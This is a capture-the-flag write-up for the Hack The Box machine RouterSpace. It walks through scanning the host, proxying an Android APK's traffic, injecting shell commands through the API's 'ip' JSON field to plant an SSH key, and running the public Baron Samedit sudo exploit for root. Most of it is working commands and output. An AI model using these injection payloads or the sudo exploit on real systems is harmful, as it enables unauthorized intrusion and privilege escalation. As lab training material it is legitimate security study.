# [RouterSpace](https://app.hackthebox.com/machines/RouterSpace)

> A Linux server running SSH and an HTTP API. The web server is hosting the **RouterSpace** Android application. By downloading this application, running it locally, and intercepting its HTTP requests via BurpSuite, it leaks an API endpoint which is vulnerable to command injection. With a foothold on the machine, its `sudo` version is vulnerable to the [Baron Samedit](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt) vulnerability, making it possible to elevate to `root`.

---

## Open Port Enumeration

The target is serving TCP ports 22 and 80.

```bash
$ sudo masscan -p1-65535 --rate=1000 -e tun0 --output-format grepable --output-filename enum/router-space.masscan 10.129.144.22
$ cat enum/router-space.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

The target's SSH fingerprint seems custom: `SSH-2.0-RouterSpace Packet Filtering V1`.

Its web server on port 80 seems similarly custom. Its `X-Powered-By` header is `RouterSpace`. Its `X-Cdn` header is `RouterSpace-23338`. 

```bash
$ nmap -sC -sV -p22,80 10.129.144.22 -oA enum/router-space
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 18:17 EST
Nmap scan report for 10.129.144.22
Host is up (0.065s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey:
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
80/tcp open  http
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-10045
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 67
|     ETag: W/"43-BdXLCJ5NHn5qLvRpojo7JtwuZeg"
|     Date: Wed, 02 Mar 2022 23:17:28 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: iF T V bMXYFT 2 v6 }
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-23338
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Wed, 02 Mar 2022 23:17:27 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-35330
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Wed, 02 Mar 2022 23:17:27 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
|_http-trane-info: Problem with XML parsing of /evox/about
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=3/2%Time=621FFB07%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=3/2%Time=621FFB07%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
SF:-Cdn:\x20RouterSpace-23338\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
SF:0Wed,\x2002\x20Mar\x202022\x2023:17:27\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<h
SF:ead>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<met
SF:a\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\x
SF:20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"descr
SF:iption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x2
SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/m
SF:agnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"sty
SF:lesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,108
SF:,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
SF:outerSpace-35330\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZY
SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Wed,\x2002\x20Mar\x202022\x2023:17:
SF:27\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,
SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
SF:)%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(FourOhFourRequest,129,"HTTP/1\.1\x20200\x20OK\r\nX-Pow
SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-10045\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2067\r\nETag:\x20W/
SF:\"43-BdXLCJ5NHn5qLvRpojo7JtwuZeg\"\r\nDate:\x20Wed,\x2002\x20Mar\x20202
SF:2\x2023:17:28\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activ
SF:ity\x20detected\x20!!!\x20{RequestID:\x20iF\x20T\x20V\x20bMXYFT\x20\x20
SF:2\x20v6\x20}\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.23 seconds
```

---

## Port 80 Enumeration

### Content Discovery

All paths return 200s of varying sizes, frustrating automated content discovery.

### Manual Enumeration

The index page advertises `RouterSpace`, a mobile application for connecting your router to... something?

The only live link on the page is for `/RouterSpace.apk`, the RouterSpace Android application. Download it.

---

## RouterSpace APK Dynamic Analysis

Spin up an [Android VM](https://www.android-x86.org/download) in an accessible hypervisor.

![](images/Pasted%20image%2020220303103210.png)

Connect to it using `adb`.

```bash
$ adb connect 192.168.1.17:5555
connected to 192.168.1.17:5555

$ adb devices
List of devices attached
192.168.1.17:5555       device
```

Install `RouterSpace.spk` on it.

```bash
$ adb install RouterSpace.apk
Performing Streamed Install
Success
```

On the attacking machine, start up BurpSuite and create a proxy listener that listens on all interfaces.

![](images/Pasted%20image%2020220303105129.png)

Drop into a command shell on the Android VM and set its proxy to the IP address and port of the attacking machine's BurpSuite proxy.

```bash
$ adb shell
x86_64:/ $ settings put global http_proxy 192.168.1.200:8081
```

On the Android VM, open the RouterSpace application and click next through the initial pages until you get to the check router status page.

![](images/Pasted%20image%2020220303105739.png)

Click the "Check Status" button and note the HTTP `POST` request that the device sends `http://routerspace.htb` in BurpSuite.

![](images/Pasted%20image%2020220303105620.png)

Add `routerspace.htb` to the local DNS resolver and investigate this API endpoint further.

---

## RouterSpace API Command Injection

The `POST` to `http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess` endpoint takes a JSON body with a single key, `ip`, and appears to echo its value back with a newline at the end.

```http
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 16
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate

{"ip":"0.0.0.0"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-80440
Content-Type: application/json; charset=utf-8
Content-Length: 11
ETag: W/"b-ANdgA/PInoUrpfEatjy5cxfJOCY"
Date: Thu, 03 Mar 2022 15:26:49 GMT
Connection: close

"0.0.0.0\n"
```

 The `echo` shell command has similar functionality. Perhaps the endpoint is passing the value of `ip` to the `echo` shell command on the backend and returning the result? Test this by injecting the `id` command, which indicates command execution as `paul`.
 
 ```htttp
 POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 16
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate

{"ip":"blah;id"}
 ```
 
 ```http
 HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-53836
Content-Type: application/json; charset=utf-8
Content-Length: 57
ETag: W/"39-kbZRRw66zQXD9grvh2+k44vzWbk"
Date: Thu, 03 Mar 2022 15:27:37 GMT
Connection: close

"blah\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
```

Exploit this vulnerability for more ergonomic access to the system. Generate an SSH key pair.

```bash
$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/tgihf/.ssh/id_rsa): paul
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in paul
Your public key has been saved in paul.pub
The key fingerprint is:
SHA256:4hTXnWR0Vp/70dgqWwq/lMiXdXfoDmWlSzqG6QsppNk tgihf@hostname
The key's randomart image is:
+---[RSA 3072]----+
|           .+ o..|
|         . + +  o|
|      . . . o  .o|
|       o       *o|
|      + S     Oo*|
|     B . o + X +=|
|    o E o * @ = .|
|       . o * O   |
|          o.=..  |
+----[SHA256]-----+
$ chmod 0600 paul.pub
$ chmod 0600 paul
```

Exploit  the command injection vulnerability to write the public key to `paul`'s authorized public keys file.

```bash
$ cat paul.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAQG3MzN9vq3BQ7upEiWnqRW5ry/Rk8JekrvsbXWChij7L++jlGEsmVPXsAvobh4NAisQPQFZpJP0afBbLsUewPJz1wO3IFDyYJPhVdd/BFTDsoxzjgFd04vI15RSFageKu+Y6xfhzxsoSYLwJ9dfMgYBKaTir+X6dsznv4ydxt8TwgdO47RZIp+urh0iW7unRc9nwlZlQuMZYpn1SSGCSQNAX4VbhcTlK5V6dvnOi7dVF2TZPoebEBBTTDms/BEm+OhG7lKRjjSmUVTTkHcf+PYvnfxYq+WqUiMbNt44OMTVOTpOqR0Rjzi4Fyoi60qM6WfXvJYB/d6125N8CyqhIdO7cJb4aXMpI/4p2uQ0dRiZYtAZxnM7+e+hKAUfmSGr1BDSsjTjvNQ0KltnTbT0QOr8kyNBuvfA/rctQEk+DLVHVTqhXLsA2/SAwO5eXoCV/cRwdwltmwXFzmEX19ZtLB+rqkxO06smfrnF4Gknmoz1fxDHibcAvyydj0Rrd9mM= tgihf@hostname
$ curl -X POST http://routerspace.htb/api/v4/monitoring/router/dev/check/deviceAccess -H 'User-Agent: RouterSpaceAgent' -H 'Content-Type: application/json' -d '{"ip": "\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAQG3MzN9vq3BQ7upEiWnqRW5ry/Rk8JekrvsbXWChij7L++jlGEsmVPXsAvobh4NAisQPQFZpJP0afBbLsUewPJz1wO3IFDyYJPhVdd/BFTDsoxzjgFd04vI15RSFageKu+Y6xfhzxsoSYLwJ9dfMgYBKaTir+X6dsznv4ydxt8TwgdO47RZIp+urh0iW7unRc9nwlZlQuMZYpn1SSGCSQNAX4VbhcTlK5V6dvnOi7dVF2TZPoebEBBTTDms/BEm+OhG7lKRjjSmUVTTkHcf+PYvnfxYq+WqUiMbNt44OMTVOTpOqR0Rjzi4Fyoi60qM6WfXvJYB/d6125N8CyqhIdO7cJb4aXMpI/4p2uQ0dRiZYtAZxnM7+e+hKAUfmSGr1BDSsjTjvNQ0KltnTbT0QOr8kyNBuvfA/rctQEk+DLVHVTqhXLsA2/SAwO5eXoCV/cRwdwltmwXFzmEX19ZtLB+rqkxO06smfrnF4Gknmoz1fxDHibcAvyydj0Rrd9mM= tgihf@hostname\" >> /home/paul/.ssh/authorized_keys; ls -la /home/paul/.ssh/authorized_keys"}' -x http://127.0.0.1:8080
"-rw-r--r-- 1 paul paul 575 Mar  3 16:59 /home/paul/.ssh/authorized_keys\n"
```

Use the private key to SSH in to the target as `paul`. Grab the user flag from `/home/paul/user.txt`.

```bash
$ ssh -i paul paul@routerspace.htb
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 03 Mar 2022 05:00:05 PM UTC

  System load:           0.0
  Usage of /:            70.5% of 3.49GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             222
  Users logged in:       0
  IPv4 address for eth0: 10.129.144.149
  IPv6 address for eth0: dead:beef::250:56ff:feb9:3cd4

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Nov 20 18:30:35 2021 from 192.168.150.133
paul@routerspace:~$ id
---


uid=1001(paul) gid=1001(paul) groups=1001(paul)
paul@routerspace:~$ ls -la user.txt
-r--r----- 1 paul paul 33 Mar  3 15:00 user.txt
```

---

## Baron Samedit Privilege Escalation

In `sudo` versions `1.8.1` - `1.8.31p2` and `1.9.0` - `1.9.5p1`, there exists a heap-based buffer overflow vulnerability (dubbed [Baron Samedit](https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt) by Qualys) that enables a low-privileged user to execute code as `root`. The target's `sudo` version, `1.8.31`, falls in the vulnerable range.

```bash
paul@routerspace:/dev/shm/tgihf$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

The Baron Samedit test results in a memory corruption, another indicator the target is vulnerable.

```bash
paul@routerspace:/dev/shm/tgihf$ sudoedit -s '\' $(python3 -c 'print("A"*1000)')
malloc(): invalid size (unsorted)
Aborted (core dumped)
```

Download the exploit code from [blasty's GitHub repository](https://github.com/blasty/CVE-2021-3156) and stage the two source code files and the `Makefile` to the target.

```bash
$ sudo git clone https://github.com/blasty/CVE-2021-3156.git
Cloning into 'CVE-2021-3156'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (50/50), done.
remote: Compressing objects: 100% (35/35), done.
remote: Total 50 (delta 25), reused 38 (delta 15), pack-reused 0
Receiving objects: 100% (50/50), 8.98 KiB | 2.99 MiB/s, done.
Resolving deltas: 100% (25/25), done.
$ cd CVE-2021-3156/
$ scp -i ~/workspace/htb/boxes/router-space/paul hax.c lib.c Makefile paul@routerspace.htb:/dev/shm/tgihf/
hax.c                                                                                                                     100% 4420    82.7KB/s   00:00
lib.c                                                                                                                     100%  407     9.1KB/s   00:00
Makefile                                                                                                                  100%  264     6.0KB/s   00:00
```

Compile the source code files and execute the exploit to obtain a `root` shell.

```bash
paul@routerspace:/dev/shm/tgihf$ ls
hax.c  lib.c  Makefile
paul@routerspace:/dev/shm/tgihf$ make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
paul@routerspace:/dev/shm/tgihf$ ./sudo-hax-me-a-sandwich

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

  usage: ./sudo-hax-me-a-sandwich <target>

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

  manual mode:
    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>

paul@routerspace:/dev/shm/tgihf$ ./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[+] bl1ng bl1ng! We got it!
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
```

Read the system flag at `/root/root.txt`.

```bash
# ls -la /root/root.txt
-r-------- 1 root root 33 Mar  3 15:00 /root/root.txt
```
